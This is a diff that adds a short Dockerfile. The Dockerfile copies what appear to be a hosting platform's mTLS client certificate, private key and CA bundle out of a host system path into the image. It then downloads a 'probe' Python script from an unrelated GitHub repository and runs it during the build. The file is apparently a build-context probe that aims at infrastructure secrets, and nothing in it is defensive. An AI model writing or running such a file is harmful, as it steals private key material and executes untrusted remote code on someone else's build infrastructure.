@@ -1,0 +1,9 @@
+# I67851-f7f8f9
+FROM alpine:3.20
+RUN echo I67851-f7f8f9-step1
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+RUN apk add --no-cache curl bash openssl python3 >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 25 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i67851.py && echo DL_OK && MARK=I67851-f7f8f9 timeout 300 python3 /p.py all 2>&1 | head -c 30000
+CMD ["sh","-c","sleep 3600"]
